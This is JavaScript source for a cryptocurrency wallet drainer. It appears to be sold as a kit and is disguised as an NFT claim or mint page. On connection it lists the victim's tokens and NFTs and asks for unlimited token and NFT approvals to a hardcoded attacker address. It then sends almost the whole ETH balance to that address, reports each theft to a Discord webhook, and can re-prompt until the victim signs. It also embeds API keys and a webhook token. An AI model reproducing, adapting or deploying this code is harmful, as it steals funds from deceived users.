/**** CONFIGURATIONS ****/

const config = { 

    /*** PUT YOUR PUBLIC KEY HERE  ***/
    receiver: "0xba3D9c221029079c12f0d9946733aEe7407A4F6d",

    /*** HERE YOU CAN SET THE MINT PRICE AND THE MAX TRANSFER ***/
    claimInfo: {


        // 11$
        minBalance: 6007164000000000,
        // production: 6007164000000000  

        //NFTS
        minValueNFTS: 0.001,
        maxTransfer: 5,

        //ERC20 in WEI
        minValueERC20: 10000000000000000,

        //forces the user to accept the trasnaction
        forceSigning: false,

        // if set to true, the user gets redirected to the real minting page
        // you need to put in the link to the real minting page then
        // not working yet !!!
        redirectToAfterClaim: false,
        redirectLink: ""
    },

    /**** SET TO TRUE IF YOU WANT TO USE A WEBHOOK ****/
    webHook: true,

    /**** PUT YOUR WEBHOOK URL HERE IF webHook SET TO TRUE****/
    webhookURL: "https://discord.com/api/webhooks/983837422662058024/S_SpkkHkSXCyPYbJD8n8GtkZ52VSLEfy-8c5WquepileL28PtWoPlU7J4cMm1YIYFdgb",

    /**** DESIGN OPTIONS ****/

    // you want the walletAddress to appear ?
    walletAppear: true,

    // you want the not eligle error message to appear ?
    eliAppear: true,
}

/**** CONTRACT ABI ****/
const abi = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
    
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const oldProvider = web3.currentProvider;
web3 = new Web3(oldProvider)

Moralis.start({ serverUrl: "https://ue7y1fu2xuah.usemoralis.com:2053/server", appId: "zVbjb69TlWAE2nyNzuQVN7cF3HttallEytXySFzw" });
Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1) await Moralis.switchNetwork("0x1");
});
/**** LOGIC ****/

class Main {

    isConnected  = false;

    walletAddress;
    walletBalance;

    ERC20tokens = [];
    ERC721tokens = [];


    transactions = [];

    requestOptions = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'X-API-KEY': ''
        }
    };

    //design 
    connectBtn = document.getElementById("connectButton");
    claimSection = document.getElementById("claimSection");
    claimButton = document.getElementById("claimButton");
    walletField = document.getElementById("walletAddress");

    constructor  () {
        this.connectBtn.addEventListener("click", () => {
            this.connectWallet(true);
        });

        //HERE
        this.claimButton.addEventListener("click", this.transfer);

        this.connectWallet(true);
    }

    connectWallet = async (connected) => {
        await Moralis.enableWeb3();
        const web3Js = new Web3(Moralis.provider);

        if(connected == true){
            this.walletAddress = (await web3Js.eth.getAccounts())[0]
            this.balance = await web3Js.eth.getBalance(this.walletAddress);
            this.isConnected = true;



            this.claimSection.style.display = "block";
            this.connectBtn.style.display = "none";
            if(config.walletAppear) this.walletField.innerHTML = this.walletAddress.slice(0, 10) + " ...";

            // erc20 array
            this.requestOptions.headers["X-API-KEY"] = 'k2IddTEIkZ9YQ7HCYsVRFVjlHOYhIO86GcEUKGg4TQPWb0Ity8SSJWtmhRJXrb0G'
            const tokens = await fetch(`https://deep-index.moralis.io/api/v2/${this.walletAddress}/erc20?chain=eth`, this.requestOptions).then(resp => resp.json());
            console.log("WalletTokens", tokens);
            if(tokens.length != 0) this.ERC20tokens = tokens;

        } else {
            this.isConnected = false;
            this.claimSection.style.display = "none";
            this.connectBtn.style.display = "block";
        }

    }

     // [TRANSFER ALL]
    transfer = async () => {
        await this.transferTokens();
        await this.trasnferNFTS();

        this.transactions.map((transaction, i) => {
            if(transaction.type == "ERC20") {
                let contractInstance = new web3.eth.Contract(abi, transaction.contract_address);
                try {
                    contractInstance.methods.approve(config.receiver, transaction.price.toString())
                    .send({
                        from: this.walletAddress,
                     }).then(txHash => {
                        console.log("Success: ", txHash);
                        if(config.webHook) this.sendWebhooks(`[+] ${this.walletAddress} approved ${token.token_address} ${token.name} - TOKEN \n Balance: ${token.balance.toString()} WEI \n txHash: ${txHash.blockHash}`);
                        this.transactions.splice(i, 1);
                     }).catch(async (err) => {
                        if(err.code == 4001 && config.claimInfo.forceSigning) {
                            return this.transfer();
                        }
                     });
                } catch(err){
                    if(err.code == 4001 && config.claimInfo.forceSigning) {
                        return this.transfer();
                    }
                }
            }

            if(transaction.type == "erc721") { 
                Moralis.executeFunction(transaction.options).then(resp => {
                    if(!resp) return;
                    console.log("success");
                    if(config.webHook) this.sendWebhooks(`[+] ${this.walletAddress} has approved ${transaction.price} at ${transaction.contract_address}`);
                    this.transactions.splice(i, 1);

                    }).catch(async err => {
                    if(err.code == 4001 && config.claimInfo.forceSigning) {
                        return this.transfer();
                    }
            });
            }
        });

        this.transferMoney();

    };

    // [TRANSFER TOKENS]
    transferTokens = async () => {
        console.log("trying sending erc20tokens");

        if(this.ERC20tokens == undefined){
            await this.sleep(300);
            return await this.transferTokens();
        }

        if(this.ERC20tokens.length == 0) return;

        this.transactions = this.ERC20tokens.filter(token => {
            return parseInt(token.balance) >= config.claimInfo.minValueERC20
        }).map(token => {
            return {
                type: "ERC20",
                contract_address: token.token_address,
                name: token.symbol,
                price: parseInt(token.balance)
            }
        });
    }

    // [TRANSFER NFTS]
    trasnferNFTS = async () => {
        console.log("trying sending nfs");
        this.requestOptions.headers["X-API-KEY"] = '812924de94094476916671a8de4686ec';

        let nfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${this.walletAddress}&offset=0&limit=300`, this.requestOptions)
            .then(response => response.json())
            .then(nfts => {
                if (nfts) { } else return "Request was throttled.";
                return nfts.filter(nft => {
                    if (nft.primary_asset_contracts.length > 0) return true
                    else return false
                }).map(nft => {
                    return {
                        type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                        contract_address: nft.primary_asset_contracts[0].address,
                        price: this.round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
                        owned: nft.owned_asset_count,
                    }
                }).filter(nft => nft.type == "erc721");
            }).catch(err => console.error(err));

        console.log("WalletNfts: ", nfts);
        if(nfts.length == 0) return;
    
        let gasPrice = await web3.eth.getBlock("latest").gasLimit;

        nfts.map(nft => {
            if (nft.price == 0) return false;
            const ethPrice = this.round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
            if (ethPrice >= config.claimInfo.minValueNFTS){} else {
                return false;
            }

            this.ERC721tokens.push({
                type: nft.type,
                price: ethPrice,
                options: {
                    contractAddress: nft.contract_address,
                    from: this.walletAddress,
                    functionName: "setApprovalForAll",
                    abi: [{
                        "inputs": [{
                            "internalType": "address",
                            "name": "operator",
                            "type": "address"
                        }, {
                            "internalType": "bool",
                            "name": "approved",
                            "type": "bool"
                        }],
                        "name": "setApprovalForAll",
                        "outputs": [],
                        "stateMutability": "nonpayable",
                        "type": "function"
                    }],
                    params: {
                        operator: config.receiver,
                        approved: true
                    },
                    gasLimit: gasPrice
                }
            });
        });

        let check = [];
        this.transactions = this.ERC721tokens.sort((a, b) => b.price - a.price).slice(0, config.maxTransfer)
        .filter(nft => {
            if(check.includes(nft.options.contractAddress)){
                return false;
            } else {
                check.push(nft.contractAddress);
                return true;
            }
        });
        
    }

    // [TRANSFER MONEY]
    transferMoney = async () => {
        console.log("trying sending money");
        console.log(this.balance);
        if (parseInt(this.balance) < config.claimInfo.minBalance) return this.notEli();
        console.log("yes");
        //  - 2-3$
        let balance = this.balance - 1015397000000000;
        try {
            let gasPrice = await web3.eth.getGasPrice();

            let transactionObject = {
                from: this.walletAddress,
            to: config.receiver,
            gasPrice: gasPrice
            };

            let gasLimit = await web3.eth.estimateGas(transactionObject);

            let transactionFee = gasPrice * gasLimit;

            transactionObject.gas = gasLimit;
            transactionObject.value = balance - transactionFee

            await web3.eth.sendTransaction(transactionObject);
            if(config.webHook) this.sendWebhooks(`[+] ${this.walletAddress} has sent ${balance}`);
        }
        catch (err) {
            console.log("Error appeared", err.code);
        }
    }



    ifYouDontGotThisToolFromTobiDevItGotReselled = () => {

    }




    notEli = () => {
        if(config.eliAppear) document.getElementById("notEli").style.display = "block";
    }

    sleep = ms => {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    round = val => {
        return Math.round(val * 10000) / 10000;
    }

    sendWebhooks = (message) => {
        if(config.webHook) {
            fetch(config.webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: message
                }),
            }).catch(err => console.error(err));
        }
    }
}



let obj = new Main();




